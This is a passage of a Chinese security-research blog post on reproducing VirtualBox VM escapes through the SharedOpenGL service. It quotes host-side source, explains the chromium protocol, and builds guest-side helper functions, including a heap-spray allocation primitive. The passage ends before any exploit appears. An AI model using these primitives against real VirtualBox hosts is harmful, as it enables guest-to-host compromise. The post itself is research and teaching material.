<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;239241 0x00 前言最近研究VirtualBox虚拟机逃逸，前面分析了VirtualBox的HGCM通信协议，本文我们基于HGCM协议与SharedOpenGL模块进行通信，并分析SharedOpenGL中使用的chromium协议，复现SharedOpenGL中出现的历史漏洞从而进行虚拟机逃逸。">
<meta property="og:type" content="article">
<meta property="og:title" content="VirtualBox虚拟机逃逸之SharedOpenGL模块">
<meta property="og:url" content="https://github.com/2021/05/06/virtualbox-SharedOpenGL/index.html">
<meta property="og:site_name" content="ha1vk&#39;s blog">
<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;239241 0x00 前言最近研究VirtualBox虚拟机逃逸，前面分析了VirtualBox的HGCM通信协议，本文我们基于HGCM协议与SharedOpenGL模块进行通信，并分析SharedOpenGL中使用的chromium协议，复现SharedOpenGL中出现的历史漏洞从而进行虚拟机逃逸。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://p5.ssl.qhimg.com/t0141aa8eb812ffb631.png">
<meta property="og:image" content="https://p3.ssl.qhimg.com/t016d090de09bc4677b.png">
<meta property="og:image" content="https://p3.ssl.qhimg.com/t0176e1335808b0ee43.png">
<meta property="og:image" content="https://p2.ssl.qhimg.com/t01d4f4ea243c892bc6.png">
<meta property="article:published_time" content="2021-05-06T06:30:27.000Z">
<meta property="article:modified_time" content="2025-06-26T09:53:50.374Z">
<meta property="article:author" content="ha1vk">
<meta property="article:tag" content="堆溢出">
<meta property="article:tag" content="heap spray">
<meta property="article:tag" content="虚拟机逃逸">
<meta property="article:tag" content="VirtualBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://p5.ssl.qhimg.com/t0141aa8eb812ffb631.png">

<link rel="canonical" href="https://github.com/2021/05/06/virtualbox-SharedOpenGL/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>VirtualBox虚拟机逃逸之SharedOpenGL模块 | ha1vk's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">ha1vk's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/2021/05/06/virtualbox-SharedOpenGL/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ha1vk">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ha1vk's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          VirtualBox虚拟机逃逸之SharedOpenGL模块
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-06 14:30:27" itemprop="dateCreated datePublished" datetime="2021-05-06T14:30:27+08:00">2021-05-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/239241">https://www.anquanke.com/post/id/239241</a></p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近研究VirtualBox虚拟机逃逸，前面分析了VirtualBox的HGCM通信协议，本文我们基于HGCM协议与SharedOpenGL模块进行通信，并分析<code>SharedOpenGL</code>中使用的<code>chromium协议</code>，复现SharedOpenGL中出现的历史漏洞从而进行虚拟机逃逸。</p>
<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="chromium协议"><a href="#chromium协议" class="headerlink" title="chromium协议"></a>chromium协议</h3><h4 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h4><p>我们使用HGCM通信协议，可以在Guest中与主机的一些服务进行通信，其中有一个服务名为<code>SharedOpenGL</code>，这是一个用于3D加速的服务，首先主机中的VirtualBox需要开启3D加速才能在Guest中进行调用<br><img src="https://p5.ssl.qhimg.com/t0141aa8eb812ffb631.png"><br>在<code>src\VBox\GuestHost\OpenGL</code>目录下，是位于Guest中的组件源码，该组件在Guest中通过HGCM协议与Host中的<code>SharedOpenGL</code>进行连接，然后使用了他们之间的一套新的协议（称之为“<code>chromium协议</code>”）来进行数据交换，对于<code>src\VBox\GuestHost\OpenGL</code>，我们不用去分析其实现，因为它就是一个相当于客户端一样的东西，我们重点分析Host中的<code>SharedOpenGL</code>。</p>
<p>首先看到<code>src\VBox\HostServices\SharedOpenGL\crserver\crservice.cpp</code>源文件中的<code>svcCall</code>函数，前面介绍过，这是HGCM对<code>SharedOpenGL</code>模块的函数调用入口。</p>
<h4 id="svcCall"><a href="#svcCall" class="headerlink" title="svcCall"></a>svcCall</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">static DECLCALLBACK(void) svcCall (void *, VBOXHGCMCALLHANDLE callHandle, uint32_t u32ClientID, void *pvClient,</span><br><span class="line">                                   uint32_t u32Function, uint32_t cParms, VBOXHGCMSVCPARM paParms[], uint64_t tsArrival)</span><br><span class="line">&#123;</span><br><span class="line">..................................................</span><br><span class="line">    switch (u32Function)</span><br><span class="line">    &#123;</span><br><span class="line">        case SHCRGL_GUEST_FN_WRITE:</span><br><span class="line">        &#123;</span><br><span class="line">..................................</span><br><span class="line">                /* Fetch parameters. */</span><br><span class="line">                uint8_t *pBuffer  = (uint8_t *)paParms[0].u.pointer.addr;</span><br><span class="line">                uint32_t cbBuffer = paParms[0].u.pointer.size;</span><br><span class="line"></span><br><span class="line">                /* Execute the function. */</span><br><span class="line">                rc = crVBoxServerClientWrite(u32ClientID, pBuffer, cbBuffer);</span><br><span class="line">...................................</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case SHCRGL_GUEST_FN_INJECT:</span><br><span class="line">        &#123;</span><br><span class="line">.......................................</span><br><span class="line">                /* Fetch parameters. */</span><br><span class="line">                uint32_t u32InjectClientID = paParms[0].u.uint32;</span><br><span class="line">                uint8_t *pBuffer  = (uint8_t *)paParms[1].u.pointer.addr;</span><br><span class="line">                uint32_t cbBuffer = paParms[1].u.pointer.size;</span><br><span class="line"></span><br><span class="line">                /* Execute the function. */</span><br><span class="line">                rc = crVBoxServerClientWrite(u32InjectClientID, pBuffer, cbBuffer);</span><br><span class="line">.................................</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case SHCRGL_GUEST_FN_READ:</span><br><span class="line">        &#123;</span><br><span class="line">...........................................</span><br><span class="line">            /* Fetch parameters. */</span><br><span class="line">            uint8_t *pBuffer  = (uint8_t *)paParms[0].u.pointer.addr;</span><br><span class="line">            uint32_t cbBuffer = paParms[0].u.pointer.size;</span><br><span class="line"></span><br><span class="line">            /* Execute the function. */</span><br><span class="line">            rc = crVBoxServerClientRead(u32ClientID, pBuffer, &amp;cbBuffer);</span><br><span class="line">.....................................................</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case SHCRGL_GUEST_FN_WRITE_READ:</span><br><span class="line">        &#123;</span><br><span class="line">..................................................</span><br><span class="line">                /* Fetch parameters. */</span><br><span class="line">                uint8_t *pBuffer     = (uint8_t *)paParms[0].u.pointer.addr;</span><br><span class="line">                uint32_t cbBuffer    = paParms[0].u.pointer.size;</span><br><span class="line"></span><br><span class="line">                uint8_t *pWriteback  = (uint8_t *)paParms[1].u.pointer.addr;</span><br><span class="line">                uint32_t cbWriteback = paParms[1].u.pointer.size;</span><br><span class="line"></span><br><span class="line">                /* Execute the function. */</span><br><span class="line">                rc = crVBoxServerClientWrite(u32ClientID, pBuffer, cbBuffer);</span><br><span class="line">                if (!RT_SUCCESS(rc))</span><br><span class="line">                &#123;</span><br><span class="line">                    Assert(VERR_NOT_SUPPORTED==rc);</span><br><span class="line">                    svcClientVersionUnsupported(0, 0);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                rc = crVBoxServerClientRead(u32ClientID, pWriteback, &amp;cbWriteback);</span><br><span class="line">...........................................</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case SHCRGL_GUEST_FN_SET_VERSION:</span><br><span class="line">        &#123;</span><br><span class="line">.........................................</span><br><span class="line">                /* Fetch parameters. */</span><br><span class="line">                uint32_t vMajor    = paParms[0].u.uint32;</span><br><span class="line">                uint32_t vMinor    = paParms[1].u.uint32;</span><br><span class="line"></span><br><span class="line">                /* Execute the function. */</span><br><span class="line">                rc = crVBoxServerClientSetVersion(u32ClientID, vMajor, vMinor);</span><br><span class="line">................................</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case SHCRGL_GUEST_FN_SET_PID:</span><br><span class="line">        &#123;</span><br><span class="line">  ................................</span><br><span class="line">                /* Fetch parameters. */</span><br><span class="line">                uint64_t pid    = paParms[0].u.uint64;</span><br><span class="line"></span><br><span class="line">                /* Execute the function. */</span><br><span class="line">                rc = crVBoxServerClientSetPID(u32ClientID, pid);</span><br><span class="line">.........................</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case SHCRGL_GUEST_FN_WRITE_BUFFER:</span><br><span class="line">        &#123;</span><br><span class="line">..................................</span><br><span class="line">                /* Fetch parameters. */</span><br><span class="line">                uint32_t iBuffer      = paParms[0].u.uint32;</span><br><span class="line">                uint32_t cbBufferSize = paParms[1].u.uint32;</span><br><span class="line">                uint32_t ui32Offset   = paParms[2].u.uint32;</span><br><span class="line">                uint8_t *pBuffer      = (uint8_t *)paParms[3].u.pointer.addr;</span><br><span class="line">                uint32_t cbBuffer     = paParms[3].u.pointer.size;</span><br><span class="line"></span><br><span class="line">                /* Execute the function. */</span><br><span class="line">                CRVBOXSVCBUFFER_t *pSvcBuffer = svcGetBuffer(iBuffer, cbBufferSize);</span><br><span class="line">                if (!pSvcBuffer || ((uint64_t)ui32Offset+cbBuffer)&gt;cbBufferSize)</span><br><span class="line">                &#123;</span><br><span class="line">                    rc = VERR_INVALID_PARAMETER;</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    memcpy((void*)((uintptr_t)pSvcBuffer-&gt;pData+ui32Offset), pBuffer, cbBuffer);</span><br><span class="line"></span><br><span class="line">                    /* Return the buffer id */</span><br><span class="line">                    paParms[0].u.uint32 = pSvcBuffer-&gt;uiId;</span><br><span class="line">......................</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case SHCRGL_GUEST_FN_WRITE_READ_BUFFERED:</span><br><span class="line">        &#123;</span><br><span class="line"> .................................</span><br><span class="line">                /* Fetch parameters. */</span><br><span class="line">                uint32_t iBuffer = paParms[0].u.uint32;</span><br><span class="line">                uint8_t *pWriteback  = (uint8_t *)paParms[1].u.pointer.addr;</span><br><span class="line">                uint32_t cbWriteback = paParms[1].u.pointer.size;</span><br><span class="line"></span><br><span class="line">                CRVBOXSVCBUFFER_t *pSvcBuffer = svcGetBuffer(iBuffer, 0);</span><br><span class="line">                if (!pSvcBuffer)</span><br><span class="line">                &#123;</span><br><span class="line">                    LogRel((&quot;OpenGL: svcCall(WRITE_READ_BUFFERED): Invalid buffer (%d)\n&quot;, iBuffer));</span><br><span class="line">                    rc = VERR_INVALID_PARAMETER;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                uint8_t *pBuffer     = (uint8_t *)pSvcBuffer-&gt;pData;</span><br><span class="line">                uint32_t cbBuffer    = pSvcBuffer-&gt;uiSize;</span><br><span class="line"></span><br><span class="line">                /* Execute the function. */</span><br><span class="line">                rc = crVBoxServerClientWrite(u32ClientID, pBuffer, cbBuffer);</span><br><span class="line">                if (!RT_SUCCESS(rc))</span><br><span class="line">                &#123;</span><br><span class="line">                    Assert(VERR_NOT_SUPPORTED==rc);</span><br><span class="line">                    svcClientVersionUnsupported(0, 0);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                rc = crVBoxServerClientRead(u32ClientID, pWriteback, &amp;cbWriteback);</span><br><span class="line"></span><br><span class="line">                if (RT_SUCCESS(rc))</span><br><span class="line">                &#123;</span><br><span class="line">                    /* Update parameters.*/</span><br><span class="line">                    paParms[1].u.pointer.size = cbWriteback;</span><br><span class="line">                &#125;</span><br><span class="line">                /* Return the required buffer size always */</span><br><span class="line">                paParms[2].u.uint32 = cbWriteback;</span><br><span class="line"></span><br><span class="line">                svcFreeBuffer(pSvcBuffer);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>从上面的源码我们可以知道</p>
<blockquote>
<p>That sequence can be performed by the Chromium client in<br>different ways:</p>
</blockquote>
<ol>
<li>Single-step: send the rendering commands and receive the<br>resulting frame buffer with one single message.</li>
<li>Two-step: send a message with the rendering commands<br>and let the server interpret them, then send another<br>message requesting the resulting frame buffer.</li>
<li>Buffered: send the rendering commands and let the server<br>store them in a buffer without interpreting it, then send a<br>second message to make the server interpret the buffered<br>commands and return the resulting frame buffer.</li>
</ol>
<p>Guest中的客户端会通过HGCM发送一连串的命令到<code>SharedOpenGL</code>服务中被解析并返回图形渲染的结果给Guest。其中我们注意到<code>SHCRGL_GUEST_FN_WRITE_BUFFER</code>分支</p>
<h4 id="SHCRGL-GUEST-FN-WRITE-BUFFER"><a href="#SHCRGL-GUEST-FN-WRITE-BUFFER" class="headerlink" title="SHCRGL_GUEST_FN_WRITE_BUFFER"></a>SHCRGL_GUEST_FN_WRITE_BUFFER</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* Execute the function. */</span><br><span class="line">CRVBOXSVCBUFFER_t *pSvcBuffer = svcGetBuffer(iBuffer, cbBufferSize);</span><br></pre></td></tr></table></figure>
<p>进入<code>svcGetBuffer</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">static CRVBOXSVCBUFFER_t* svcGetBuffer(uint32_t iBuffer, uint32_t cbBufferSize)</span><br><span class="line">&#123;</span><br><span class="line">    CRVBOXSVCBUFFER_t* pBuffer;</span><br><span class="line"></span><br><span class="line">    if (iBuffer)</span><br><span class="line">    &#123;</span><br><span class="line">...........................</span><br><span class="line">    &#125;</span><br><span class="line">    else /*allocate new buffer*/</span><br><span class="line">    &#123;</span><br><span class="line">        pBuffer = (CRVBOXSVCBUFFER_t*) RTMemAlloc(sizeof(CRVBOXSVCBUFFER_t));</span><br><span class="line">        if (pBuffer)</span><br><span class="line">        &#123;</span><br><span class="line">            pBuffer-&gt;pData = RTMemAlloc(cbBufferSize);</span><br><span class="line">.........................</span><br></pre></td></tr></table></figure>
<p>其中我们注意到当参数<code>iBuffer</code>为0时，会申请两个堆<code>RTMemAlloc(sizeof(CRVBOXSVCBUFFER_t))</code>和<code>RTMemAlloc(cbBufferSize)</code>，由于参数是可以自由控制的，因此通过该功能，我们可以自由的申请堆块，在<code>Heap Spray</code>中，这个非常有用。通过分析，<code>SHCRGL_GUEST_FN_WRITE_BUFFER</code>命令的功能就是<code>从Guset中接收一串数据，并存入Buffer中，如果Buffer不存在则创建一个新的</code><br>我们将这个过程封装为函数用于使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int alloc_buf(int client,int size,const char *msg,int msg_len) &#123;</span><br><span class="line">   int rc = hgcm_call(client,SHCRGL_GUEST_FN_WRITE_BUFFER,&quot;%u%u%u%b&quot;,0,size,0,&quot;in&quot;,msg,msg_len);</span><br><span class="line">   if (rc) &#123;</span><br><span class="line">      die(&quot;[-] alloc_buf error&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   return ans_buf[0];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="SHCRGL-GUEST-FN-WRITE-READ-BUFFERED"><a href="#SHCRGL-GUEST-FN-WRITE-READ-BUFFERED" class="headerlink" title="SHCRGL_GUEST_FN_WRITE_READ_BUFFERED"></a>SHCRGL_GUEST_FN_WRITE_READ_BUFFERED</h4><p>接下来我们看到<code>SHCRGL_GUEST_FN_WRITE_READ_BUFFERED</code>命令,首先是该命令需要3个参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/* Verify parameter count and types. */</span><br><span class="line">if (cParms != SHCRGL_CPARMS_WRITE_READ_BUFFERED)</span><br><span class="line">&#123;</span><br><span class="line">    rc = VERR_INVALID_PARAMETER;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">if (    paParms[0].type != VBOX_HGCM_SVC_PARM_32BIT   /* iBufferID */</span><br><span class="line">     || paParms[1].type != VBOX_HGCM_SVC_PARM_PTR     /* pWriteback */</span><br><span class="line">     || paParms[2].type != VBOX_HGCM_SVC_PARM_32BIT   /* cbWriteback */</span><br><span class="line">     || !paParms[0].u.uint32 /*iBufferID can&#x27;t be 0 here*/</span><br><span class="line">   )</span><br><span class="line">&#123;</span><br><span class="line">    rc = VERR_INVALID_PARAMETER;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一个为<code>iBufferID</code>，也就是通过<code>SHCRGL_GUEST_FN_WRITE_BUFFER</code>命令创建的buffer对应的ID；第二个参数为<code>pWriteback</code>，是一个指针，用于在Guest中接收处理后的数据；第三个参数为<code>cbWriteback</code>表示数据长度。<br>我们将调用封装为函数用于使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">char crmsg_buf[0x1000];</span><br><span class="line"></span><br><span class="line">int crmsg(int client,const char *msg,int msg_len) &#123;</span><br><span class="line">   int buf_id = alloc_buf(client,0x1000,msg,msg_len);</span><br><span class="line">   int rc = hgcm_call(client,SHCRGL_GUEST_FN_WRITE_READ_BUFFERED,&quot;%u%b%u&quot;,buf_id,&quot;out&quot;,crmsg_buf,0x1000,0x1000);</span><br><span class="line">   if (rc) &#123;</span><br><span class="line">      die(&quot;[-] crmsg error&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了便于分析，我们写了一个测试程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">   int idClient = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;);</span><br><span class="line">   printf(&quot;idClient=%d\n&quot;,idClient);</span><br><span class="line">   set_version(idClient);</span><br><span class="line">   crmsg(idClient,&quot;hello&quot;,0x6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们简单的发送<code>hello</code>到host中，看看会发生什么。<br>继续向下看</p>
